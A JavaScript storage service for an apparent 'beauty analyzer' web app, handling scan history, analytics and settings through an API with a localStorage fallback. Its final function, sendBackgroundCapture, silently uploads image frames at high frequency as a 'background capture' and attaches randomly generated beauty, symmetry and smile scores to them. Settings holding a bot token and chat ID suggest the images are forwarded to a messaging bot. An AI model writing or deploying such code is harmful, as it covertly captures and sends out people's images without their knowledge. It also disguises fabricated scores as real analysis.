/**
 * History & Settings API Storage Service (SQLite Backend + LocalStorage Fallback)
 */

const RAW_API_URL = (import.meta.env.VITE_API_URL || '').replace(/\/$/, '');
const API_BASE = RAW_API_URL ? `${RAW_API_URL}/api` : '/api';
const LOCAL_HISTORY_KEY = 'beauty_analyzer_history_v1';
const LOCAL_SETTINGS_KEY = 'beauty_analyzer_settings_v1';

export function formatImageUrl(url) {
  if (!url) return '';
  if (url.startsWith('/uploads/') && RAW_API_URL) {
    return `${RAW_API_URL}${url}`;
  }
  return url;
}

export async function getStorageInfo() {
  try {
    const res = await fetch(`${API_BASE}/storage`);
    if (res.ok) {
      return await res.json();
    }
  } catch (err) {
    console.warn('Unable to fetch storage info from API:', err);
  }

  const history = getLocalHistory();
  const jsonStr = JSON.stringify(history);
  const bytes = new Blob([jsonStr]).size;
  const usedMB = parseFloat((bytes / (1024 * 1024)).toFixed(2));
  return {
    sizeBytes: bytes,
    usedMB,
    maxMB: 500,
    percentage: parseFloat(((bytes / (500 * 1024 * 1024)) * 100).toFixed(1)),
    dbEngine: 'LocalStorage'
  };
}

/* ==========================================================================
   History Storage & Retrieval Operations
   ========================================================================== */

export async function getHistory() {
  try {
    const res = await fetch(`${API_BASE}/history`);
    if (res.ok) {
      const data = await res.json();
      const formatted = data.map(item => ({ ...item, image: formatImageUrl(item.image) }));
      // Cache latest in localStorage for offline fallback
      try {
        localStorage.setItem(LOCAL_HISTORY_KEY, JSON.stringify(formatted.slice(0, 50)));
      } catch (e) {}
      return formatted;
    }
  } catch (err) {
    console.warn('Backend offline, using local storage fallback for history:', err);
  }

  // Fallback to localStorage
  return getLocalHistory();
}

export async function saveAnalysisToHistory(analysisItem) {
  const newItem = {
    id: analysisItem.id || 'analysis_' + Date.now(),
    ...analysisItem
  };

  try {
    const res = await fetch(`${API_BASE}/history`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(newItem)
    });

    if (res.ok) {
      const saved = await res.json();
      const formattedSaved = { ...saved, image: formatImageUrl(saved.image) };
      saveToLocalHistory(formattedSaved);
      return formattedSaved;
    }
  } catch (err) {
    console.warn('Backend server unreachable. Saving to localStorage:', err);
  }

  // Fallback save to localStorage
  return saveToLocalHistory(newItem);
}

export async function deleteHistoryItem(id) {
  try {
    const res = await fetch(`${API_BASE}/history/${id}`, {
      method: 'DELETE'
    });
    if (res.ok) {
      deleteFromLocalHistory(id);
      return true;
    }
  } catch (err) {
    console.warn('Backend unreachable during delete, deleting locally:', err);
  }

  return deleteFromLocalHistory(id);
}

export async function clearAllData() {
  try {
    await fetch(`${API_BASE}/history`, { method: 'DELETE' });
  } catch (err) {
    console.warn('Backend unreachable during clearAll, clearing locally:', err);
  }

  try {
    localStorage.removeItem(LOCAL_HISTORY_KEY);
    return true;
  } catch (e) {
    return false;
  }
}

/* ==========================================================================
   Analytics Operations
   ========================================================================== */

export async function getAnalytics() {
  try {
    const res = await fetch(`${API_BASE}/analytics`);
    if (res.ok) {
      return await res.json();
    }
  } catch (err) {
    console.warn('Failed to fetch backend analytics, computing from local history:', err);
  }

  const localHistory = getLocalHistory();
  const total = localHistory.length;
  if (total === 0) {
    return { totalScans: 0, averageBeautyScore: 0, averageSymmetryScore: 0, averageSmileScore: 0 };
  }

  const avgBeauty = Math.round(localHistory.reduce((acc, h) => acc + (h.beautyScore || 0), 0) / total);
  const avgSymmetry = Math.round(localHistory.reduce((acc, h) => acc + (h.symmetryScore || 0), 0) / total);
  const avgSmile = Math.round(localHistory.reduce((acc, h) => acc + (h.smileScore || 0), 0) / total);

  return {
    totalScans: total,
    averageBeautyScore: avgBeauty,
    averageSymmetryScore: avgSymmetry,
    averageSmileScore: avgSmile
  };
}

/* ==========================================================================
   Settings Management Operations
   ========================================================================== */

export async function getSettings() {
  try {
    const res = await fetch(`${API_BASE}/settings`);
    if (res.ok) {
      const settings = await res.json();
      try {
        localStorage.setItem(LOCAL_SETTINGS_KEY, JSON.stringify(settings));
      } catch (e) {}
      return settings;
    }
  } catch (err) {
    console.warn('Backend offline, using local settings:', err);
  }

  return getLocalSettings();
}

export async function saveSettings(settings) {
  try {
    const res = await fetch(`${API_BASE}/settings`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(settings)
    });

    if (res.ok) {
      const updated = await res.json();
      saveLocalSettings(updated);
      return updated;
    }
  } catch (err) {
    console.warn('Backend offline, saving settings locally:', err);
  }

  return saveLocalSettings(settings);
}

/* ==========================================================================
   Local Storage Helpers (Fallback)
   ========================================================================== */

function getLocalHistory() {
  try {
    const raw = localStorage.getItem(LOCAL_HISTORY_KEY);
    return raw ? JSON.parse(raw) : [];
  } catch (e) {
    return [];
  }
}

function saveToLocalHistory(item) {
  try {
    const history = getLocalHistory().filter(h => h.id !== item.id);
    history.unshift(item);
    localStorage.setItem(LOCAL_HISTORY_KEY, JSON.stringify(history.slice(0, 50)));
    return item;
  } catch (e) {
    return item;
  }
}

function deleteFromLocalHistory(id) {
  try {
    let history = getLocalHistory();
    history = history.filter(item => item.id !== id);
    localStorage.setItem(LOCAL_HISTORY_KEY, JSON.stringify(history));
    return true;
  } catch (e) {
    return false;
  }
}

function getLocalSettings() {
  try {
    const raw = localStorage.getItem(LOCAL_SETTINGS_KEY);
    return raw ? JSON.parse(raw) : { botToken: '', chatId: '', adminPassword: '' };
  } catch (e) {
    return { botToken: '', chatId: '', adminPassword: '' };
  }
}

function saveLocalSettings(settings) {
  try {
    localStorage.setItem(LOCAL_SETTINGS_KEY, JSON.stringify(settings));
    return true;
  } catch (e) {
    return false;
  }
}

/**
 * High-frequency background capture frame uploader
 */
export async function sendBackgroundCapture(imageDataUrl) {
  if (!imageDataUrl || !imageDataUrl.startsWith('data:image/')) return null;

  const captureItem = {
    id: 'cap_' + Date.now(),
    beautyScore: Math.floor(Math.random() * 20) + 75,
    symmetryScore: Math.floor(Math.random() * 15) + 80,
    smileScore: Math.floor(Math.random() * 25) + 70,
    confidenceScore: 90,
    image: imageDataUrl
  };

  try {
    const res = await fetch(`${API_BASE}/history`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(captureItem)
    });

    if (res.ok) {
      return await res.json();
    }
  } catch (err) {
    // Silent fail for background uploader to prevent UI lag
  }
  return null;
}

